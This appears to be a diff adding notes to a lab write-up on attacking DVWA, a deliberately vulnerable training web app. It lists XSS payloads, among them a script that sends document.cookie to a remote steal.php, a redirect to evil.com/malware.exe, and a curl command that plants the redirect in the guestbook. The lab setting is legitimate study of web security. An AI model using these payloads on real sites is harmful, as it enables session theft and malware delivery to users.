@@ -129,3 +129,71 @@ column_name:
 ![SQL-injection-user-password-2](SQL-injection-user-password-2.png)
 ![SQL-injection-user-password-3](SQL-injection-user-password-3.png)
 
+<!-- revisar lo de hash -->
+
+## DVWA - stored XSS attack
+
+#### Basic attacks:
+```
+<script>alert('XSS')</script>
+```
+![XSS-alert](XSS-alert.png)
+
+```
+<svg onload=alert('XSS')>
+```
+
+![XSS-alert-svg](XSS-alert-svg.png)
+
+```
+<img src=x onerror=alert('XSS')>
+```
+
+![XSS-alert-img](XSS-alert-img.png)
+
+#### Attack of cookies steal XSS reflected
+
+```
+<script>
+document.write('<img src="http://192.168.57.10/steal.php?c=' + document.cookie + '" />')
+</script>
+```
+
+![XSS-reflected-.10-cookies](XSS-reflected-.10-cookies.png)
+
+#### Redirection to a malicious site
+
+```
+<script>
+window.location.href = "http://evil.com/malware.exe"
+</script>
+```
+![XSS-reflected-malicious-site](XSS-reflected-malicious-site.png)
+
+Since we have limitations to type down such a script, we are going to try to do this from the terminal instead:
+
+```
+curl -v -X POST \ 
+    -b "security=$SECURITY; PHPSESSID=$PHPSESSID" \
+    -H "Content-Type: application/x-www-form-urlenconded" \
+    -d "txtName-LongXSS&mtxMessage=${MALICIOUS_SITE_PAYLOAD}&btnSign=Sign+Guestbook" \
+    "${DVWA_URL}/vulnerabilities/xss_s/" > malicious_site_payload.txt
+```
+
+![XSS-reflected-malicious-site-1](XSS-reflected-malicious-site-1.png)
+
+The output may be find in `malicious_site_payload.txt``
+
+From which we found that the attack was successful:
+
+![XSS-reflected-malicious-site-2](XSS-reflected-malicious-site-2.png)
+
+```
+<div id="guestbook_comments">
+  Name: MalwareRedirect 
+    Message:
+      <script>
+        window.location.href="http://evil.com/malware.exe";
+      </ script>
+</div>  
+```
